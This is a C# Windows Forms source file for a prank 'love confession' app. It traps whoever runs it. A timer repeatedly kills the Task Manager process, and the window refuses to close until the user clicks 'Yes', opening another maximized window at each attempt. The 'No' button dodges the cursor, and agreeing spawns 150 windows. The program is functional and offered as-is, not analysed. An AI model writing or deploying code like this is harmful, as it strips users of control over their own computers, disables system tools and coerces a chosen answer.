using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace TianciLove
{
    public partial class Love : Form
    {
        public Love()
        {
            InitializeComponent();
        }

        int bianliang = 0, x = 0, y = 0;
        Random rd = new Random();

        #region 窗体相关
        /// <summary>
        /// 窗体初始化
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Love_Load(object sender, EventArgs e)
        {
            timer1.Start();
        }

        /// <summary>
        /// 窗体关闭事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Love_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (bianliang != 1)
            {
                e.Cancel = true;
                // 给个蛤蟆
                Heart heart = new Heart();
                // 留个按钮
                heart.FormBorderStyle = FormBorderStyle.Sizable;
                // 最大化打开
                heart.WindowState = FormWindowState.Maximized;
                heart.Show();
                //MessageBox.Show("不同意是关不掉的哦!!!");
            }
        }
        #endregion

        #region 按钮相关
        /// <summary>
        /// 拒绝按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnNo_Click(object sender, EventArgs e)
        {
            MessageBox.Show("再给你一次机会!!!");
        }

        /// <summary>
        /// 拒绝按钮鼠标放上事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnNo_MouseMove(object sender, MouseEventArgs e)
        {
            BtnMove(this.btnNo);
        }

        /// <summary>
        /// 同意按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnYes_Click(object sender, EventArgs e)
        {
            ShowHama();
            bianliang = 1;
        }

        /// <summary>
        /// 同意按钮鼠标放上事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnYes_MouseMove(object sender, MouseEventArgs e)
        {
            //BtnMove(this.btnNo);
        }
        #endregion

        #region 方法相关
        /// <summary>
        /// 同意方法
        /// </summary>
        public void Yes()
        {
            MessageBox.Show("❤❤❤就知道你会同意❤❤❤");
            //Process.Start("https://lovetianci.cn/Love/index.html");
            bianliang = 1;
            Application.Exit();
        }

        /// <summary>
        /// 定时器
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        /// <remarks>禁用任务管理器</remarks>
        private void timer1_Tick(object sender, EventArgs e)
        {
            // 获取进程列表
            Process[] ps = Process.GetProcesses();
            foreach (Process item in ps)
            {
                // 如果是任务管理器
                if (item.ProcessName == "Taskmgr")
                {
                    item.Kill();// 停止进程
                }
            }
        }

        /// <summary>
        /// 按钮移动
        /// </summary>
        /// <param name="button"></param>
        public void BtnMove(Button button)
        {
            x = rd.Next(1, 350);
            y = rd.Next(1, 210);
            button.Location = new Point(x, y);
        }

        /// <summary>
        /// 显示图片
        /// </summary>
        private void ShowHama()
        {
            for (int i = 0; i < 150; i++)
            {
                Heart heart = new Heart();
                heart.FormBorderStyle = FormBorderStyle.Sizable;
                heart.Show();
            }
        }
        #endregion
    }
}